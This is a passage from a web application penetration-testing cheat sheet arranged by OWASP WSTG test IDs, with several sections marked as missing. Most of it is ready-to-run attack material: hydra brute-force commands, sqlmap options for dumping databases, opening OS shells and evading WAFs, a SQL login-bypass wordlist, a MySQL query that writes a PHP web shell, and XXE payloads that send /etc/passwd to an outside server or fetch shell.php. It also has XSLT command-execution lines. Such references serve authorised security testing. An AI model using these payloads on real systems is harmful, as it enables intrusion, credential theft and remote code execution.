   - Any DNS record pointing to a expired domain can be taken over by registering the expired domain - e.g.: `old-product-seo-page.com`
   - Any not anymore used entry pointing to public services as github, etc. can be taken over by registering the old subdomain with that organisation - e.g.: `old-organisation-name.github.com`

- Testing all `CNAME` records for `NXDOMAIN` responses can help identify potential candidates for subdomain takeover

### 4.2.11 Test Cloud Storage (WSTG-CONF-11)

 - Try to read data you should not have access to  
   - `curl -X GET https://<cloud-storage-service>/<object>`
 - Try to upload a file  
   - `curl -X PUT -d 'test' 'https://<cloud-storage-service>/test.txt'`
 - Testing for Amazon S3 Bucket Misconfiguration  
   - `curl --no-progress-meter -L https://pentest-experts.com | grep "s3"`
   - `aws s3 ls s3://<bucket-name>` (lists all files if bucket is public)  
   - `aws s3 cp test.txt s3://bucket-name/test.txt` (upload a file)
 - Testing for Azure Blob misfonfiguration
   - `curl --no-progress-meter -L https://pentest-experts.com | grep "blob.core.windows.net"`
   - `curl https://<storage-account-name>.blob.core.windows.net/<container-name>?restype=container&comp=list`
   - `curl -X PUT -H "x-ms-blob-type: BlockBlob" --data-binary @test.txt https://<storage-account-name>.blob.core.windows.net/<container-name>/test.txt`
 - Testing for GCS Bucket misconfiguration
   - `curl --no-progress-meter -L https://example.com | grep "storage.googleapis.com"`
   - `https://storage.googleapis.com/<bucket-name>/`
   - `curl -X PUT --data-binary @test.txt -H "Content-Type: text/plain" https://storage.googleapis.com/<bucket-name>/test.txt`

[Table of Contents](#table-of-contents)

---

## 4.3 Identity Management Testing

### 4.3.1 Test Role Definitions (WSTG-IDNT-01)

 - Fuzz possible roles:
   - cookie variable (e.g. `role=admin`, `isAdmin=True`)
   - account variable (e.g. `Role: manager`)
   - hidden directories or files (e.g. `/admin`, `/mod`, `/backups`)
   - switching to well known users (e.g. `admin`, `backups`, etc.)

### 4.3.2 Test User Registration Process (WSTG-IDNT-02)

 - Check that the identity requirements for user registration are aligned with business and security requirements:
   - Can anyone register for access or are registered identities verified?
   - Are registrations vetted by a human prior to provisioning, or are they automatically granted if the criteria are met?
   - Can the same person or identity register multiple times?
   - Can users register for different roles or permissions?
   - What proof of identity is required for a registration to be successful?

 - Validate the registration process:
   - Can identity information be easily forged or faked?
   - Can the exchange of identity information be manipulated during registration?

### 4.3.3 Test Account Provisioning Process (WSTG-IDNT-03)

 - Check that the requirements for account provisioning/de-provisioning are aligned with business and security requirements:
   - Is there any verification, vetting and authorization of provisioning requests?
   - Is there any verification, vetting and authorization of de-provisioning requests?
   - Can an administrator provision other administrators or just users?
   - Can an administrator or other user provision accounts with privileges greater than their own?
   - Can an administrator or user de-provision themselves?
   - How are the files or resources owned by the de-provisioned user managed? Are they deleted? Is access transferred?

### 4.3.4 Testing for Account Enumeration and Guessable User Account (WSTG-IDNT-04)

 - Testing for different error messages when logging in with 
   - existing username and wrong password 
   - non-existing username and wrong password
 - Testing common usernames like `admin`, `administrator`, etc.
 - Usernames "leaked" in contents of the page (e.g. next to an article, comment, etc.)
 - Usernames enumerateable via parameter (e.g. `profile.php?user_id=1`, `profile.php?user=mark`)
 - [Using wpscan for automated user enumeration](#cms-enumeration--bruteforce-attack)

### 4.3.5 Testing for Weak or Unenforced Username Policy (WSTG-IDNT-05)

 - Testing for easy guessable usernames like `m.berger`, `mberger`, `mark.berger` for Mark Berger, etc.

[Table of Contents](#table-of-contents)

---

## 4.4 Authentication Testing

### 4.4.1 Testing for Credentials Transported over an Encrypted Channel (WSTG-ATHN-01)

 - Ensure all logins and each exchange of session tokens are done over a encrypted (HTTPS) connection.
 - Verify session cookies have the `secure` and also `http-only` attribute set when creating them.
 - Check if the site uses `HSTS`.
 - `humble -u https://pentest-experts.com -b`  
   Testing HTTP security headers https://github.com/rfc-st/humble

### 4.4.2 Testing for Default Credentials (WSTG-ATHN-02)

 - Searching for known default credentials 
 - Testing if a login is possible with them

### 4.4.3 Testing for Weak Lock Out Mechanism (WSTG-ATHN-03)

 - Testing lockout mechanism
   - Try to login up to 10 times with a wrong password
   - If there is no lockout message, try to login with the correct password
   - If there is no lockout after 10 attempts, there is not lockout meachanism -> Report that
   - Try while your 1st user account is locked to login with a 2nd useraccount
     - If that still works, lockout does apply only to useraccount not to IP -> Report that

 - Testing capture security
   - MISSING ❗❗❗

#### HTTP login bruteforcing

**BASIC authentication**

 - `hydra -l admin -P /usr/share/wordlists/1000_common_passwords.txt -f 1.2.3.4 http-get /admin/`  
    use `-s` to specify a port (e.g. `-s 8080`)
 - `hydra -L /usr/share/wordlists/common_users.txt -P /usr/share/wordlists/1000_common_passwords.txt -f 1.2.3.4 http-get /admin/`

 Try also HTTP verb tampering - so try to send `GET` requests as `POST` and vice versa to test for a insecure server configuration.

**DIGEST authentication**

This is a challenge response auth. and much more secure / difficult to attack then BASIC auth.

 - `hydra -L /usr/share/wordlists/common_users.txt -P /usr/share/wordlists/1000_common_passwords.txt -f 1.2.3.4 http-get /admin/`  
   Hydra can detect the type of auth. and that's why the same command can attack BASIC and DIGEST auth.

**Web login form**

 - `hydra -l admin -P /usr/share/wordlists/1000_common_passwords.txt pentest-experts.com http-post-form "/login.php:user=^USER^&password=^PASS^:F=incorrect"`  
    `^USER^` and `^PASS^` get replaced by the credentials from the list(s) and `:F=` specifies a flag to determin if the login failed  
    Use for example `:S=302` to set the success flag to the value `302`, which occure in a HTTP redirect  
    Use `-s 8080` to specify an non-standard port - like 8080 in the example

 **Username generation**

  - `./username-anarchy Jane Smith > jane_smith_usernames.txt`  
    Create a username list

**Targeted wordlists**

 - `cupp -i` (interactive mode)

### 4.4.4 Testing for Bypassing Authentication Schema (WSTG-ATHN-04)

#### Parameter modification

 - Try to change values like `authenticated=no` to `yes` in
   - Cookies 
   - GET-parameters
   - hidden-fields

#### Session ID prediction

 - Try to predict or bruteforce a session ID because they are based on
   - the user ID
   - the unix timestamp
   - a sequential number
   - etc.

### 4.4.5 Testing for Vulnerable Remember Password (WSTG-ATHN-05)

 - Test if credentials are stored encrypted in a browser mechanism (e.g. webstorage) when using this function.
 - Test if credentials can be disclosed by 
   - XSS
   - Clickjacking
   - CSRF
 - Test if session-tokens or IDs do not expire of have a very long expiration time of multiple months or years. 
   - In this case cookie theft become a issue and thatfor report that!

### 4.4.6 Testing for Browser Cache Weaknesses (WSTG-ATHN-06)

**Testing history**

 - Test if form data like usernames or passwords are accessable after using the back button
   - If so, missing `Cache-Control: must-revalidate`

**Testing cache**

 - Check if for any page mandeling sensitive data (user, password, email, phone number, credit-card number, ...) those settings are present in the header:
   ```http
   Cache-Control: no-cache, no-store
   Expires: 0
   Pragma: no-cache
   ```
 - Check data in the browser with the developer tools

### 4.4.7 Testing for Weak Password Policy (WSTG-ATHN-07)

 - Test if ther is a password policy at all
   - if so, report missing policy  
     
 - Test if the password policy is enforced by trying to setup a password that should not be allowed like a password which is to short or a password missing a character type (e.g. no uppercase letter)
   - if so, report inpropper enforcing
 
 - Try to register a user account with password `Password1!` or `Pa$$w0rd`, which are formally "secure" as they contain uppercase and lowercase letters, a number and special character but they are also on basically every wordlist. 
   - If that password is allowed, there is no blacklist in place for known weak passwords!

### 4.4.8 Testing for Weak Security Question Answer (WSTG-ATHN-08)

 - Testing capture questions for 
   - limited amount of possibilities
   - answer in hidden field or similiar
   - easy solveable like `2+3=`  
     *(this example could be parsed out of the page and solved with eval(...) in Python)*
 
 - Testing if capures change after each attempt or if they can be bruteforced
   - Check if there is a lockout mechanism

 - Check if questions can be solved with OSINT
   - Maiden name of mother
   - First school
   - etc.

### 4.4.9 Testing for Weak Password Change or Reset Functionalities (WSTG-ATHN-09)

#### Testing password reset functions

 - Test if users, other than administrators, can change or reset passwords for accounts other than their own
   - e.g. subvert the password change or reset process to change or reset the password of another user by manipulationg a ID or something of that kind

 - Test if the password reset process is vulnerable to CSRF

 - Check if OTP or token used in the reset link send to email for user verification can be bruteforced
   - Reset password once with OTP / link
   - Trigger a new reset
   - Try bruteforcing OTP / token

####  Testing password change functions

 - Is the old password needed to change?
 - Test if the password change process is vulnerable to CSRF

### 4.4.10 Testing for Weaker Authentication in Alternative Channel (WSTG-ATHN-10)

 - Test is there are other authentication channels, which allow weaker authentification methods like unencrypted HTTP.  
   Those channele could be:
   - API
   - Mobile phone optimized version (e.g. http://m.pentest-experts.com/)
   - Mobile phone app
   - Alternative domain
   - etc.

[Table of Contents](#table-of-contents)

---

## 4.5 Authorization Testing

### 4.5.1 Testing Directory Traversal File Include (WSTG-ATHZ-01)

**Overcome filtering:**

  1. use `....//` to overcome removal of `../` from parameters
  2. use `....\/` to overcome removal of `../` from parameters
  3. use `....////` to overcome removal of `../` from parameters
  4. URL encode `../` into `..%2F` or `%2E%2E%2F`

Try to use 

 - `\` instead
 - `%252F` (double URL encoding)
 - `%25252F` (tripple URL encoding)
 - `%f0%80%ae%f0%80%ae%f0%80%afetc%f0%80%afpasswd` (overlong UTF-8 encoding for /etc/passwd)

### 4.5.2 Testing for Bypassing Authorization Schema (WSTG-ATHZ-02)

❗❗❗MISSING❗❗❗

### 4.5.3 Testing for Privilege Escalation (WSTG-ATHZ-03)

❗❗❗MISSING❗❗❗

### 4.5.4 Testing for Insecure Direct Object References (WSTG-ATHZ-04)

 - IDs, numbers or other identification patterns in filenames - e.g. `Bill_2024_00123.pdf`
 - IDs / UserIDs in URLs - e.g. `download.php?fid=123` or `my_files.php?uid=123`

When facing pseudo-random looking object references like `download.php?fid=202cb962ac59075b964b07152d234b70` then ceck for:

 - Encoding (Base64, Hex, ...) of known values like UserID, FileID, etc.
 - Hashes (MD5, SHA-x, ...) of known values like UserID, FileID, etc.
 - JS functions performing the hash calculation on the frontend which allow you to see how they are done.

Don't forget to test also for IDOR in APIs!

[Table of Contents](#table-of-contents)

---

## 4.6 Session Management Testing

### 4.6.1 Testing for Session Management Schema (WSTG-SESS-01)

Sessions use some form of identification to tie different HTTP requests together. This Identifier can be a:

 - GET parameter / argument
 - POST parameter / argument
 - Cookie / Web-Storage
 - Proprietary solution

### 4.6.2 Testing for Cookies Attributes (WSTG-SESS-02)

❗❗❗MISSING❗❗❗

#### Recommended HTTP security relevant header settings for additional hardening:

 - `Strict-Transport-Security: max-age=31536000 ; includeSubDomains`  
   Activate HTTP Strict Transport Security (HSTS) to prevent HTTPS -> HTTP downgrading
 - `X-Frame-Options: deny`  
   Improves the protection of web applications against clickjacking - no rendering within a frame.
 - `X-Content-Type-Options: nosniff`  
   Prevent the browser from interpreting files as a different MIME type to what is specified in the Content-Type HTTP header (e.g. treating text/plain as text/css)
 - `Content-Security-Policy: script-src 'self'`  
   Define which scripts the protected resource can execute. A content security policy can have significant impact on the way browsers render pages (e.g., inline JavaScript or CSS can disabled).
 - `X-Permitted-Cross-Domain-Policies: none`  
   A cross-domain policy file is an XML document that grants a web client, such as Adobe Flash Player or Adobe Acrobat (though not necessarily limited to these), permission to handle data across domains.
 - `Referrer-Policy: no-referrer`  
   The Referer header will be omitted entirely. No referrer information is sent along with requests.
 - `Clear-Site-Data: "cache","cookies","storage"`  
   Indicates that the server wishes to remove locally cached data, cookies and all DOM storage objects for the origin of the response URL.
 - `Cross-Origin-Embedder-Policy: require-corp`  
   A document can only load resources from the same origin, or resources explicitly marked as loadable from another origin.
 - `Cross-Origin-Opener-Policy: same-origin`  
   Isolates the browsing context exclusively to same-origin documents. Cross-origin documents are not loaded in the same browsing context.
 - `Cross-Origin-Resource-Policy: same-origin`  
   Only requests from the same Origin (i.e. scheme + host + port) can read the resource.
 - `Cache-Control: no-store, max-age=0`  
   `Pragma: no-cache`  
   Do not be stored in any cache.

### 4.6.3 Testing for Session Fixation (WSTG-SESS-03)

 1. Obtain a session identifier
 2. Find a way to fixate the session identifier  
    e.g.: a redirect which hand over the session identifier in the URL for session creation
 3. Force a victim to browse this redirect with a value controlled by you

### 4.6.4 Testing for Exposed Session Variables (WSTG-SESS-04)

❗❗❗MISSING❗❗❗

### 4.6.5 Testing for Cross Site Request Forgery (WSTG-SESS-05)

❗❗❗MISSING❗❗❗

### 4.6.6 Testing for Logout Functionality (WSTG-SESS-06)

❗❗❗MISSING❗❗❗

### 4.6.7 Testing Session Timeout (WSTG-SESS-07)

❗❗❗MISSING❗❗❗

### 4.6.8 Testing for Session Puzzling (WSTG-SESS-08)

❗❗❗MISSING❗❗❗

### 4.6.9 Testing for Session Hijacking (WSTG-SESS-09)

 - XSS to get session identifiers (if Cookie is not `HTTPOnly`) 
 - CSRF to perform some action on behalf of the vistim
 - Browser histroy or logs can contain session identifiers
 - Traffic sniffing can reveal session identifiers
 - Bruteforce in case the session identifier has no sufficient randomness
 - From disk of the webserver 
   - PHP stores session in files - location is defined in `session.save_path` in `php.ini`  
     Default: `/var/lib/php/sessions/sess_[SESSIONID]`
   - Tomcat stores session in the file `SESSIONS.ser`
   - .NET stores session in:
     - the application worker process (aspnet_wp.exe), when using InProc Session mode
     - a StateServer (a Windows Service), when using OutProc Session mode
     - a SQL database

[Table of Contents](#table-of-contents)

---

## 4.7 Input Validation Testing

### 4.7.1 Testing for Reflected Cross Site Scripting (WSTG-INPV-01)

 - `xsser --gtk`
 - `xsser --url "https://pentest-experts.com/index.php?page=dns-lookup.php" -p "target_host=XSS&dns-lookup-php-submit-button=Lookup+DNS" --cookie "PHPSESSID=gp9j95cv3q1tki2nsg8mml4lt6;showhints=0" --drop-cookie --auto --reverse-check -s`
 - https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection

**Prevention tips:**

 - Using XSS prevention headers.
 - Using the appropriate Content-Type for the page, like `X-Content-Type-Options=nosniff`.
 - Using `Content-Security-Policy` options, like `script-src 'self'`, which only allows locally hosted scripts. (https://web.dev/articles/csp?hl=en)
 - Using the `HttpOnly` and `Secure` cookie flags to prevent JavaScript from reading cookies and only transport them over HTTPS.

**Log poisioning to attack admin users**

 - Poision webserver logs e.g. via `User-Agent` header with XSS or HTMLi code to attack admin users viewing logs in a web interface.

### 4.7.2 Testing for Stored Cross Site Scripting (WSTG-INPV-02)

❗❗❗MISSING❗❗❗

 - see: [Reflected XSS](#471-testing-for-reflected-cross-site-scripting-wstg-inpv-01)

### 4.7.3 Testing for HTTP Verb Tampering (WSTG-INPV-03)

... Changing the HTTP methods (`GET`, `POST`, `PUT`, ...) to provoke different behaviour of the application.

 - `curl -v -X GET 1.2.3.4`
 - `curl -v -X HEAD 1.2.3.4`
 - `curl -v -X POST 1.2.3.4`
 - `curl -v -X POST --data "param1=value1&param2=value2" 1.2.3.4`
 - `curl https://pentest-experts.com/upload/ --upload-file webshell.php`
 - `nmap -p 80 --script http-method-tamper --script-args 'http-method-tamper.paths={/upload/,/protected/index.php}' 1.2.3.4`
  - Enumerarte allowed methods using nikto  
   `nikto -h "https://pentest-experts.com/search.php?q=xxx"`
 - Try using a not allowed method on purpose to provoke a error message

#### HTTP verbs/methods

 - GET
 - HEAD
 - POST
 - PUT
 - DELETE
 - CONNECT
 - OPTIONS
 - TRACE

❗❗❗ Try also: [HTTP method overriding](#http-method-overriding-with-x-http-method-header)

### 4.7.4 Testing for HTTP Parameter Pollution (WSTG-INPV-04)

❗❗❗MISSING❗❗❗

### 4.7.5 Testing for SQL Injection (WSTG-INPV-05)

You can change `--risk` to try riskier statements but some SQLi injection points like an `UPDATE` statement can overwrite all data in a table when combined with a `OR`-based payload (`--risk 3`). The setting `--risk 2` adds heavy time-based queries.

 - `sqlmap -r request.txt --level 5 --risk 3 -p vulnerable_field --random-agent --dbs`  
   Use captured request from ZAP / BurpSuite and use a random user agent string instrad of the sqlmap UA sting as many WAFs drop requests from sqlmap.
 - `sqlmap --dbms=mysql -u "https://pentest-experts.com/?search=xxx" --cookie="SID=123456ABC" --level 5 --risk 1 -p search --dbs`
 - `sqlmap --dbms=mysql -u "https://pentest-experts.com/?search=xxx" --cookie="SID=123456ABC" --level 5 --risk 1 -p search -D db_name --tables`
 - `sqlmap --dbms=mysql -u "https://pentest-experts.com/?search=xxx" --cookie="SID=123456ABC" --level 5 --risk 1 -p search -D db_name -T table_name --dump`
 - `sqlmap --dbms=mysql -u "https://pentest-experts.com/search/xxx*" --cookie="SID=123456ABC" --level 5 --risk 1 --dbs`  
   Explot the serach-value `xxx` in "nice" URLs - `*` can be used an marker in any field like cookies or GET-parameters, not only in "nice" URLs.
 - `sqlmap --dbms=mysql -u "https://pentest-experts.com/?search=xxx" --cookie="SID=123456ABC" --prefix "'" --suffix " -- "`  
   Specify suffix to start the SQLi and suffix to comment the left-overs out
 - `sqlmap --dbms=mysql -u "https://pentest-experts.com/?search=xxx" --cookie="SID=123456ABC" --technique U`  
   Specify query type - here UNION queries
 - `` 
 - `sqlmap --dbms=mysql -u "https://pentest-experts.com/?search=xxx" --cookie="SID=123456ABC" --os-pwn`
 - `sqlmap --dbms=mysql -u "https://pentest-experts.com/?search=xxx" --cookie="SID=123456ABC" --os-shell`
 - `sqlmap --dbms=mysql -u "https://pentest-experts.com/?search=xxx" --cookie="SID=123456ABC" --sql-shell`
 - `sqlmap -r request.txt --parse-errors --dbs`  
   Parse SQL errors and output them to the console
 - `sqlmap -r request.txt --code=200 --dbs`  
   Use HTTP response code 200 to detect `True` - useful in case a `False` response would result in a different status code (e.g. 500 server error or 302 redicrection).
 - `sqlmap -r request.txt --string="Welcome" --dbs`  
   Detect `True` / `False` responses based on the presence / absence of a string.
 - `sqlmap -r request.txt --union-cols=5 --dbs`  
   Specify the number of coulumns for a unin based query manually.
 - `sqlmap -r request.txt --passwords`  
   Get the password-hashes from the users within the DBMS itself.
 - https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection
 - https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection#authentication-bypass

Try also HTTP verb tampering - so try to send `GET` requests as `POST` and vice versa to test for insufficient filtering.

**Manual prefix testing**

 1. Testing `https://pentest-experts.com/case6.php?col=id'` = No output = Not sure if it worked
 2. Testing `https://pentest-experts.com/case6.php?col=id"` = No output = Not sure if it worked
 3. Testing `https://pentest-experts.com/case6.php?col=id%60` - SQL Error = Confirmed working but prefix not correct
 4. Testing `https://pentest-experts.com/case6.php?col=id%60+--+` - SQL Error = Confirmed working but prefix not correct, trying to add `)`
 5. Testing `https://pentest-experts.com/case6.php?col=id%60)+--+` - SQL Error = Confirmed working but prefix not correct, trying to add `)`
 6. Testing `https://pentest-experts.com/case6.php?col=id%60))+--+` - Some data output = Confirmed working, prefix correct, using `--prefix="%60))"` in SQLmap

 In case there is no error, I would try `')`, `'))`, ... and `")`, `"))`, ...

**Login bypass wordlist**

```
' OR 1=1-- 
' OR 1=1# 
' OR 1=1/* 
" OR 1=1-- 
" OR 1=1# 
" OR 1=1/* 
` OR 1=1-- 
` OR 1=1# 
` OR 1=1/* 
') OR 1=1-- 
') OR 1=1# 
') OR 1=1/* 
") OR 1=1-- 
") OR 1=1# 
") OR 1=1/* 
`) OR 1=1-- 
`) OR 1=1# 
`) OR 1=1/* 
' OR '1'='1 
" OR "1"="1 
` OR `1`=`1 
' UNION SELECT 1, 'admin', 'password'-- 
' UNION SELECT 1, 'admin', 'password'# 
' UNION SELECT 1, 'admin', 'password'/* 
" UNION SELECT 1, "admin", "password"--
" UNION SELECT 1, "admin", "password"# 
" UNION SELECT 1, "admin", "password"/* 
` UNION SELECT 1, `admin`, `password`-- 
` UNION SELECT 1, `admin`, `password`# 
` UNION SELECT 1, `admin`, `password`/* 
```

**Bypassing defense mechanisms**

 - `sqlmap -r request.txt --random-agent --dbs`  
   User random user agent to overcome UA blocking
 - `sqlmap -r request.txt --csrf-token="csrf-token-parameter-name" --dbs`  
   Read and use CSRF token for each request
 - `sqlmap -r request.txt --randomize="parameter-name-for-random-value" --dbs`  
   Calculate a new random message for each request 
 - `sqlmap -r request.txt --eval="import hashlib; hash_parameter=hashlib.md5(msg).hexdigest()" --dbs`  
   Calculate hash for each request (using Python code)
 - `sqlmap -r request.txt --proxy="socks4://127.0.0.1:9050" --dbs`  
   Use TOR proxy to overcome IP address blocking
 - `sqlmap -r request.txt --chunked --dbs`  
   Send payloads in multiple HTTP packages as chunks to avoid detection
 - `sqlmap -r request.txt --hpp --dbs`  
   Split payloads in multiple instance of the same parameter (e.g.: `?id=1&id=UNION&id=SELECT&id=username,password&id=FROM&id=users`)  
   Works only if a target concatinate those like ASP does!
 - `sqlmap -r request.txt --tamper=0eunion,base64encode,between,commalesslimit,equaltolike,halfversionedmorekeywords,modsecurityversioned,modsecurityzeroversioned,percentage,plus2concat,space2comment,space2dash,space2hash,space2mssqlblank,space2plus,space2randomblank,symboliclogical,versionedkeywords,versionedmorekeywords --dbs`  
   Using pre-defined tamper scripts to bypass WAF/IPS solutions:
    - `0eunion`  
      Replaces instances of `UNION` with `e0UNION`
    - `base64encode`  
      Base64-encodes all characters in a given payload
    - `between`  
      Replaces greater than operator (`>`) with `NOT BETWEEN 0 AND #` and equals operator (`=`) with `BETWEEN # AND #`
    - `commalesslimit`  
      Replaces (MySQL) instances like `LIMIT M, N` with `LIMIT N OFFSET M` counterpart
    - `equaltolike`  
      Replaces all occurrences of operator equal (`=`) with `LIKE` counterpart
    - `halfversionedmorekeywords`  
      Adds (MySQL) versioned comment before each keyword
    - `modsecurityversioned`  
      Embraces complete query with (MySQL) versioned comment
    - `modsecurityzeroversioned`  
      Embraces complete query with (MySQL) zero-versioned comment
    - `percentage`  
      Adds a percentage sign (`%`) in front of each character (e.g. `SELECT` -> `%S%E%L%E%C%T`)
    - `plus2concat`  
      Replaces plus operator (`+`) with (MsSQL) function `CONCAT()` counterpart
    - `randomcase`  
      Replaces each keyword character with random case value (e.g. `SELECT` -> `SEleCt`)
    - `space2comment`  
      Replaces space character with comments `/
    - `space2dash`  
      Replaces space character with a dash comment (`--`) followed by a random string and a new line (`\n`)
    - `space2hash`  
      Replaces (MySQL) instances of space character with a pound character (`#`) followed by a random string and a new line (`\n`)
    - `space2mssqlblank`  
      Replaces (MsSQL) instances of space character with a random blank character from a valid set of alternate characters
    - `space2plus`  
      Replaces space character with plus (`+`)
    - `space2randomblank`  
      Replaces space character with a random blank character from a valid set of alternate characters
    - `symboliclogical`  
      Replaces `AND` and `OR` logical operators with their symbolic counterparts (`&&` and `||`)
    - `versionedkeywords`  
      Encloses each non-function keyword with (MySQL) versioned comment
    - `versionedmorekeywords`  
      Encloses each keyword with (MySQL) versioned comment  

#### MySQL access to remote code execution (RCE)

 - `SELECT '<?php echo system($_GET["c"]) ?>' INTO OUTFILE '/var/www/html/upload/shell.php' FROM mysql.user LIMIT 1`

#### 4.7.5.1 Testing for Oracle

❗❗❗MISSING❗❗❗

#### 4.7.5.2 Testing for MySQL

 - `mysql -h 1.2.3.4`
 - `mysql -h 1.2.3.4 -u user`
 - `mysql -h 1.2.3.4 -u user -p`
 - **msf5>** `use auxiliary/scanner/mysql/mysql_writeable_dirs`
 - **msf5>** `use auxiliary/scanner/mysql/mysql_hashdump`
 - **msf5>** `use auxiliary/scanner/mysql/mysql_login`
 - **mysql [dvwa]>** `select load_file('/etc/passwd')`
 - `nmap -p 3306 1.2.3.4 --script mysql-empty-password`
 - `nmap -p 3306 1.2.3.4 --script mysql-info`
 - `nmap -p 3306 1.2.3.4 --script mysql-audit --script-args "mysqluser=root,mysqlpass=password1"`
 - `nmap -p 3306 1.2.3.4 --script mysql-variables --script-args "mysql-audit.username=root, mysql-audit.password=password1, mysql-audit.filename=/usr/share/nmap/nselib/data/mysql-cis.audit"`
 - `nmap -p 3306 1.2.3.4 --script mysql-dump-hashes --script-args "username=root, password=password1"`
 - `hydra -L users.txt -P rockyou.txt 1.2.3.4 mysql`

#### 4.7.5.3 Testing for SQL Server

 - `nmap -p 3306 1.2.3.4 --script ms-sql-info`
 - `nmap -p 3306 1.2.3.4 --script ms-sql-empty-password`
 - `nmap -p 3306 1.2.3.4 --script ms-sql-ntlm-info --script-args "mssql.instance-port=1433"`
 - `nmap -p 3306 1.2.3.4 --script ms-sql-ntlm-info --script-args "mssql.instance-port=1433"`
 - `nmap -p 3306 1.2.3.4 --script ms-sql-dump-hashes --script-args "mssql.username=admin, mssql.password=password1"`
 - `nmap -p 3306 1.2.3.4 --script ms-sql-xp-cmdshell --script-args "mssql.username=admin, mssql.password=password1, ms-sql-xp-cmdshell.cmd='ipconfig /all'"`
 - **msf5>** `use auxiliary/scanner/mssql/mssql_login`
 - **msf5>** `use auxiliary/scanner/mssql/mssql_hashdump`
 - **msf5>** `use auxiliary/admin/mssql/mssql_exec`
 - **msf5>** `use auxiliary/admin/mssql/mssql_enum`
 - **msf5>** `use auxiliary/admin/mssql/mssql_enum_sql_logins`
 - **msf5>** `use auxiliary/admin/mssql/mssql_enum_domain_accounts`

#### 4.7.5.4 Testing PostgreSQL

❗❗❗MISSING❗❗❗

#### 4.7.5.5 Testing for MS Access

❗❗❗MISSING❗❗❗

#### 4.7.5.6 Testing for NoSQL Injection

❗❗❗MISSING❗❗❗

 - `NoSQLMap` (... then follow the assistant)
 - https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/NoSQL%20Injection 

#### 4.7.5.7 Testing for ORM Injection

❗❗❗MISSING❗❗❗

#### 4.7.5.8 Testing for Client-side

❗❗❗MISSING❗❗❗

### 4.7.6 Testing for LDAP Injection (WSTG-INPV-06)

❗❗❗MISSING❗❗❗

### 4.7.7 Testing for XML Injection (WSTG-INPV-07)

#### XXE 

**DOS / full example:**

```xml
<?xml version="1.0"?>
<!DOCTYPE email [
  <!ENTITY a0 "BOOM" >
  <!ENTITY a1 "&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;">
  <!ENTITY a2 "&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;">
  <!ENTITY a3 "&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;">
  <!ENTITY a4 "&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;">
  <!ENTITY a5 "&a4;&a4;&a4;&a4;&a4;&a4;&a4;&a4;&a4;&a4;">
  <!ENTITY a6 "&a5;&a5;&a5;&a5;&a5;&a5;&a5;&a5;&a5;&a5;">
  <!ENTITY a7 "&a6;&a6;&a6;&a6;&a6;&a6;&a6;&a6;&a6;&a6;">
  <!ENTITY a8 "&a7;&a7;&a7;&a7;&a7;&a7;&a7;&a7;&a7;&a7;">
  <!ENTITY a9 "&a8;&a8;&a8;&a8;&a8;&a8;&a8;&a8;&a8;&a8;">
  <!ENTITY aa "&a9;&a9;&a9;&a9;&a9;&a9;&a9;&a9;&a9;&a9;">
  <!ENTITY ab "&aa;&aa;&aa;&aa;&aa;&aa;&aa;&aa;&aa;&aa;">
  <!ENTITY ac "&ab;&ab;&ab;&ab;&ab;&ab;&ab;&ab;&ab;&ab;">
  <!ENTITY badstuff "&ac;&ac;&ac;&ac;&ac;&ac;&ac;&ac;&ac;&ac;">
]>
<profile_data>
  <name>Peter</name>
  <email>&badstuff;</email>
</profile_data>
```

**Reading local files:**

```xml
<!DOCTYPE name_or_parent_element [
  <!ENTITY badstuff SYSTEM "file:///etc/passwd">
]>
```

**Reading sorce code:**

```xml
<!DOCTYPE name_or_parent_element [
  <!ENTITY badstuff SYSTEM "php://filter/convert.base64-encode/resource=index.php">
]>
```

(Need PHP filter to be installed and active)

To overcome this we need to provide this DTD file:

```xml
<!ENTITY badstuff "%begin;%file;%end;">
```

General entities can#t be used in the DTD but only in the document itself - that's why 

Then we can use the parameter entity `%xxe`:

```xml
<!DOCTYPE name_or_parent_element [
  <!ENTITY % begin "<![CDATA[">
  <!ENTITY % file SYSTEM "file:///var/www/html/index.php">
  <!ENTITY % end "]]>">
  <!ENTITY % xxe SYSTEM "https://pentest-experts.com/xxe.dtd">
  %xxe;
]>
```

(Wrap file contents in `<![CDATA[` ... `]]>` to mark it as raw data and prevent XML parser errors)

Error based XXE:

We need to provide this DTD file:

```xml
<!ENTITY % file SYSTEM "file:///var/www/html/index.php">
<!ENTITY % badstuff "<!ENTITY content SYSTEM '%nonExistingEntity;/%file;'>">
```

Then we can use this code to trigger the error:

```xml
<!DOCTYPE name_or_parent_element [ 
  <!ENTITY % xxe SYSTEM "https://pentest-experts.com/xxe.dtd">
  %xxe;
  %badstuff;
]>
```

**RCE:**

```xml
<!DOCTYPE name_or_parent_element [
  <!ENTITY badstuff SYSTEM "expect://curl$IFS-O$IFS'https://pentest-experts.com/shell.php'">
]>
```

(requires the PHP expect module to be installed and enabled)

Spaces, `<`, `>`, `|`, `{`, `}`, ... break the XML syntax - avoid them!

**Out of band XXE:**

Useful in a total blind situation where we see no reflected data and no error messages.

We need to provide a DTD:

```xml
<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
<!ENTITY % oob "<!ENTITY badstuff SYSTEM 'https://pentest-experts.com/get_data.php?content=%file;'>">
```

Then we need a XXE injection code:

```xml
<!DOCTYPE email [ 
  <!ENTITY % remote SYSTEM "https://pentest-experts.com/xxe.dtd">
  %remote;
  %oob;
]>
```

... which we trigger by using `&badstuff;` in the XML document, which is defined in the DTD file.

**Tools:**

 - https://github.com/enjoiz/XXEinjector 

#### XSLT - Extensible stylesheet language transformation

**Information disclosure:**

```
Version: <xsl:value-of select="system-property('xsl:version')" />
<br/>
Vendor: <xsl:value-of select="system-property('xsl:vendor')" />
<br/>
Vendor URL: <xsl:value-of select="system-property('xsl:vendor-url')" />
<br/>
Product Name: <xsl:value-of select="system-property('xsl:product-name')" />
<br/>
Product Version: <xsl:value-of select="system-property('xsl:product-version')" />
```

**LFI:**

```
<xsl:value-of select="unparsed-text('/etc/passwd', 'utf-8')" />
```

(Need XSLT version 2.0)

**RCE:**

```
<xsl:value-of select="php:function('file_get_contents','/etc/passwd')" />
<xsl:value-of select="php:function('system','whoami')" />
```

